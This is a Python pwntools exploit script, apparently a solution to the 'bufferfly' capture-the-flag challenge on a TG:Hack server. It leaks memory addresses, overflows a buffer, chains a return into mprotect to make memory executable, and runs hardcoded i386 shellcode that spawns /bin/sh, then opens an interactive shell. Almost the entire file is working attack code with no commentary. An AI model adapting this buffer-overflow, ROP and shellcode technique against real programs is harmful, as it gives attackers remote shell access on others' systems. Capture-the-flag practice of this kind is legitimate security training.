from pwn import *
import time
import re
context.update(arch='i386', os='linux', log_level='debug')


p = remote('bufferfly.tghack.no', 6002)
#p = process('bufferfly')


def _recv(t):
    global p
    time.sleep(1)
    data = p.recvrepeat(t)
    return data

def findAddr(strs):
    reg = re.compile('0x[a-f0-9]{7,8}')
    mt = reg.findall(strs)
    return int(mt[0], 16)


_recv(0.2)

#raw_input('debugging')
p.sendline('a'*17+'\x00'+p32(25))

data = _recv(0.2)
print data

addr_secret = findAddr(data)


p.sendline('a'*0x1c+'A'*4 + p32(addr_secret)) 

_recv(0.2)

p.sendline('mattac')


data =_recv(0.2)
print data

addr_buf = findAddr(data)


p.sendline('')
data = _recv(0.2)
print data

p.sendline('mprotec')

data = _recv(0.2)
print data
addr_mprotect = findAddr(data)


offset_secret = 0x805
addr_base = addr_secret - offset_secret
offset_p3ret = 0x801
#mprotect
arg0_mp = p32(addr_buf & ~(4096-1))
log.info('pageboundary: '+ arg0_mp)
arg1_mp = p32(4096)
arg2_mp = p32(7)

#shellcode = asm(shellcraft.i386.linux.sh()) #error
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode +=  "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode +=  "\xcd\x80\x31\xc0\x40\xcd\x80";

log.info(shellcode.encode('hex'))

p.sendline('')

_recv(0.2)

size_toRET = 72
payload = shellcode
payload += '\x90'*(size_toRET - len(shellcode))
payload += p32(addr_mprotect) + p32(addr_base + offset_p3ret) + arg0_mp + arg1_mp + arg2_mp + p32(addr_buf)

p.sendline(payload)


p.interactive()

log.info(hex(addr_mprotect))

